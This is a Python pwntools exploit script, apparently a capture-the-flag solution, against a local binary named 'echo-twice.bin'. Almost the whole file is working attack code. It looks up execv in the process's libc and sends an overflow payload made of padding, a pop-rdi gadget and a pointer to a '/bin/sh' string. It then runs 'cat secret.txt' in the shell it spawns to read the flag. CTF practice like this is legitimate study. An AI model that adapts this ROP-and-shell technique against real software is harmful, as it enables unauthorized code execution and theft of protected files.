#!/usr/bin/python3

from pwn import *
import time
import sys

def exploit():
    #exploit logic here
    p = process("./echo-twice.bin")

    #the address of execv from the process's libc
    libc = p.libc
    execv_address = libc.symbols['execv']

    #input dummy to the safe_echo.
    p.recvuntil(b'input safely\n')
    p.sendline(b'I love burgir')
    p.recvline()

    #/bin/sh part of the string is located at +62 bytes from 0x400970
    #now sending payload
    p.recvuntil(b'run /bin/sh\n')
    nnuull=p64(0x0)
    bins=p64(0x400970 + 62)
    pop_rdi=p64(0x400923)
    payload = nnuull + (b'A' * 32) + pop_rdi + bins + p64(execv_address)
    p.send(payload)

    #waiting for the shell to launch, and retrieve the flag
    time.sleep(0.1)

    p.sendline(b'cat secret.txt')

    print(p.recvline())


if __name__ == "__main__":
    exploit()
